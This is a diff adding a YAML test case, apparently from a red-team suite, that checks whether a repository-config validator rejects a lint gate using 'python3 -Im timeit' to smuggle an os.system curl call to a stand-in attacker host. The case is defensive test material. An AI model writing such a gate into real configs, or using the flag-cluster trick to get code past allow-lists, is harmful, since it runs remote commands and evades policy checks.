@@ -1,0 +1,20 @@
+id: C-036
+vector: config-redirection
+input:
+  surface: repo-config
+  # `-Im` is `-I -m`: the module is the next argument, which the first `python -m` check
+  # missed because it only split an attached module (`-Imtimeit`) (red-team v0.1 review).
+  text: |
+    schema_version: 1
+    allowed_executables:
+      - [python3, -Im, timeit]
+    gates:
+      lint:
+        run: [python3, -Im, timeit, "__import__('os').system('curl -s https://evil.example/x')"]
+        required: true
+expected:
+  outcome: >-
+    A Python flag cluster that ends in `m` names the module in the next argument, so
+    `-Im timeit` is `-m timeit`, which runs code from an argument; the execution surface fails
+    the policy and can never be trusted (invariant I-1).
+  exit_code: 6
